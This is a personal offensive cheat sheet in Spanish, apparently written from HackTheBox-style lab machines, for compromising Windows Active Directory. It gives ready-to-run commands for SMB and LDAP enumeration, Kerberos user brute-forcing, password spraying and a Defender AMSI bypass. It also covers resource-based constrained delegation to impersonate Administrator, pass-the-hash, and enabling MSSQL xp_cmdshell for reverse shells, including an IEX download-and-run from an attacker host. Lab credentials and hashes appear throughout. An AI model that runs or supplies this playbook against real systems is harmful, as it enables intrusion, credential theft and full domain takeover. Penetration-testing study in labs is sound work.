[[RED TEAM]]
windows ad [[ENUMERACION]]
enumerar shares del smb

crackmapexec smb 1.1.1.1 -> dice nombre de la maquina y dominio -> meter dominio en 
etc/hosts y dominio + nombre (dc.support.htb)
crackmapexec smb 1.1.1.1 -u 'user' -p 'passwd'
smbmap -H 10.10.10.10 -u '' -p ''

```
smbclient -L \\\\10.129.178.26\\ -> lista los shares con null session
```
```
smbclient \\\\10.129.178.26\\support-tools se conecta a un share
smbclient \\\\10.129.178.26\\support-tools -U 'john'
```
dir -> lista contenido 
get flag.txt -> descarga el archivo a tu pc

ENUMERAR USUARIOS CON KERBRUTE

/opt/kerbrute/kerbrute userenum -d dominio --dc 1.1.1.1 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt


WINRM
comprobar si unusuario puede usar winrm 
crackmapexec winrm 1.1.1.1 -u 'user' -p 'passwd'

LDAP
revisar si creds son validas
```bash
ldapsearch -x -H ldap://<IP> -D 'username@domain' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
```

buscar inf de un user 
```
ldapsearch -x -H ldap://<IP> -D 'username@domain' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD> | grep -i "samaccountname: user" -B 40
```

SI TENEMOS CREDS VALIDAS PARA SMB
rpcclient -U 'user%contraseña' 10.10.11.174

enumdomusers -> ver usuarios del dominio

enumdomgroups -> enumera grupos de trabajo 
cada user y cada grupo tiene un rid
querygroupmem 0x200 -> dice el rid de los users del grupo con ese rid

limpiar los usuarios
```rpcclient -U 'user%contraseña' 10.10.11.174 -c 'enumdomusers' | grep -oP '\[.?\]'  | grep -v 0x | tr -d '[]' > users ```
REVISAR SI LAS CONTRASEÑAS SE REUTILIZAN
``` 
netexec smb 10.10.11.174 -u archivoconlosusers -p 'contraseña' --continue-on-succes
```

WINRM
```
evil-winrm -i 10.10.11.174 -u 'support' -p 'Ironside47pleasure40Watchful'
```

ESCALAR PRIVILEGIOS 

ver permisos -> whoami /priv
ver grupo y info -> net user usuario
ver todos -> grupos net group

==BLOODHOUND==

hay que injectar sharphound en la maquina para que exporte un zip

sudo neo4j console
firefox localhost:7474   ->creds por defecto (cambiadas)  user:passwd ->neo4j:neo4j
abrir bloodhound
descargar sharphound (opt/sharphound)
copiar /opt/sharphound/sharphound.exe al dir de scripts de la maquina y abrir shell de winrm
PS> upload sharphound.exe
si defender no deja subirlo
PS> menu
PS> Bypass-4MSI
PS> ./SharpHound.exe -c All
PS> download C:/Users/usuario/documents/20250421103206_BloodHound.zip BH.zip
bloodhound >  upload data > subir el zip

añadir el user a owned y ver privilegios outbound object control
buscar ruta de nuestro user a admin
privilegio generic all -> rbcd.py -> otorga un service ticket -> descargar powermad.ps1 -> wget https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1 
PS> upload Powermad.ps1
PS> Import-Module ./Powermad.ps1
PS> ./Powermad.ps1
PS> New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)
PS>Get-ADComputer -identity FAKE-COMP01
PS>Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount FAKE-COMP01$
PS>Get-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount
```ps
$RawBytes = Get-DomainComputer DC -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
```



https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/resource-based-constrained-delegation.html
```bash
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

$ComputerSid = Get-DomainComputer SERVICEA -Properties objectsid | Select -Expand objectsid

```
./rbcd.py -f EVILCOMPUTER -t dc -dc-ip 10.10.11.174 support.htb\\support:Ironside47pleasure40Watchful
```
subir getST.py

```
./getST.py -spn cifs/dc.support.htb -impersonate Administrator -dc-ip 10.10.11.174 support.htb/nombrecompfalso$:passwddelcompfalso
```
New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)


```
impacket-getST -spn cifs/dc.support.htb -impersonate Administrator -dc-ip 10.10.11.174 support.htb/SERVICEA$:123456
```

si dice clock skew to great cambiar la hora
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k dc.support.htb

MSSQL
conectarse:

```bash
python3 /home/pstrn/.local/pipx/venvs/crackmapexec/bin/mssqlclient.py 'sa:MSSQLP@ssw0rd!'@10.10.11.51

netexec mssql <ip-del-servidor> -u <usuario> -p <contraseña>
# Username + Password + CMD command
crackmapexec mssql -d <Domain name> -u <username> -p <password> -x "whoami"
# Username + Hash + PS command
crackmapexec mssql -d <Domain name> -u <username> -H <HASH> -X '$PSVersionTable'

# Check if xp_cmdshell is enabled
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';

# This turns on advanced options and is needed to configure xp_cmdshell
sp_configure 'show advanced options', '1'
RECONFIGURE
#This enables xp_cmdshell
sp_configure 'xp_cmdshell', '1'
RECONFIGURE

exec xp_cmdshell 'type C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI'

revshell
exec xp_cmdshell 'powershell -e <powershellrevshell en b64>'

#One liner
EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

# Quickly check what the service account is via xp_cmdshell
EXEC master..xp_cmdshell 'whoami'
# Get Rev shell
EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.13:8000/rev.ps1") | powershell -noprofile'

# Bypass blackisted "EXEC xp_cmdshell"
'; DECLARE @x AS VARCHAR(100)='xp_cmdshell'; EXEC @x 'ping k7s3rpqn8ti91kvy0h44pre35ublza.burpcollaborator.net' —
```

usar winpeas
passthehash -> evil-winrm -i 10.10.11.42 -u Administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e

LOCAL DB
.\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "show databases;"
.\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "SHOW TABLES;" gibbon
.\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "USE gibbon; SELECT * FROM gibbonperson;"

HASH CON SALT
```
f.frizzle:$dynamic_82$067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03$/aACFhikmNopqrRTVz2489
```
```
john --format=dynamic='sha256($s.$p)' --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

GET TGT
impacket-getTGT frizz.htb/'f.frizzle':'Jenni_Luvs_Magic23' -dc-ip frizzdc.frizz.htb
export KRB5CCNAME=f.frizzle.ccache
ssh f.frizzle@frizz.htb -K

